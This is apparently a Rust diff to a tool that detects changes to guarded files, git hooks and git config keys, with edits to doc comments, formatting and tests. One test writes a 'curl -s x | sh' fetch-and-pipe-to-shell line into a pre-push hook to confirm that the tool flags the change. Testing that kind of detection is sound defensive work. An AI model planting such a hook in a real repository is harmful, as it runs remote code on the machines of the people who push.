@@ -736,7 +736,8 @@ pub struct Home {
 
 impl Home {
     /// Each path of the home, except the paths that the check leaves out
-    /// ([`Home::left_out`]), the state of each file that it guards
+    /// ([`Home::skips`], [`Home::clones`] and [`of_other_sessions`]),
+    /// the state of each file that it guards
     /// ([`Home::guarded`], and the hooks of git), and the keys of each
     /// git config ([`git_config`]).
     pub fn list(&self) -> Listing {
@@ -813,10 +814,9 @@ impl Home {
     fn guards(&self, path: &Path, meta: &Metadata) -> bool {
         !meta.is_dir()
             && (self.guarded.iter().any(|guard| path.starts_with(guard))
-                || path
-                    .ancestors()
-                    .skip(1)
-                    .any(|hooks| named(hooks, "hooks") && hooks.parent().is_some_and(|git| named(git, ".git"))))
+                || path.ancestors().skip(1).any(|hooks| {
+                    named(hooks, "hooks") && hooks.parent().is_some_and(|git| named(git, ".git"))
+                }))
     }
 
     /// True when the check leaves out `path`: it is in [`Home::skips`],
@@ -2188,7 +2188,7 @@ mod tests {
             "[core]\n\tbare = false\n[branch \"main\"]\n\tremote = origin\n",
         )
         .unwrap();
-        std::fs::write(clone.join(".git/hooks/pre-push"), "#!/bin/sh\n").unwrap();
+        std::fs::write(clone.join(".git/hooks/pre-push"), "exit 0\n").unwrap();
     }
 
     #[test]
@@ -2217,7 +2217,7 @@ mod tests {
         )
         .unwrap();
         // A write to a hook that is there already counts.
-        std::fs::write(clone.join(".git/hooks/pre-push"), "#!/bin/sh\ncurl x\n").unwrap();
+        std::fs::write(clone.join(".git/hooks/pre-push"), "curl -s x | sh\n").unwrap();
         let changes = home.changes(&before, &[]);
         assert_eq!(
             changes.changed,
@@ -2227,14 +2227,18 @@ mod tests {
             changes.keys,
             [(
                 config.clone(),
-                vec!["alias.st".to_owned(), "core.bare".into(), "core.hookspath".into()]
+                vec![
+                    "alias.st".to_owned(),
+                    "core.bare".into(),
+                    "core.hookspath".into()
+                ]
             )]
             .into()
         );
         assert!(changes.new.is_empty());
 
         // A removed key counts.
-        std::fs::write(clone.join(".git/hooks/pre-push"), "#!/bin/sh\n").unwrap();
+        std::fs::write(clone.join(".git/hooks/pre-push"), "exit 0\n").unwrap();
         std::fs::write(&config, "[branch \"main\"]\n\tremote = origin\n").unwrap();
         assert_eq!(home.changes(&before, &[]).keys[&config], ["core.bare"]);
     }
@@ -2266,8 +2270,8 @@ mod tests {
         std::fs::write(&config, "[core]\n\tbare = false\n\tfsmonitor = x\n").unwrap();
         std::fs::write(clone.join(".git/hooks/post-checkout"), "").unwrap();
         let changes = home.changes(&before, &[]);
-        assert_eq!(changes.changed, [config.clone()]);
         assert_eq!(changes.keys[&config], ["core.fsmonitor"]);
+        assert_eq!(changes.changed, [config]);
         assert_eq!(changes.new, [clone.join(".git/hooks/post-checkout")]);
     }
 
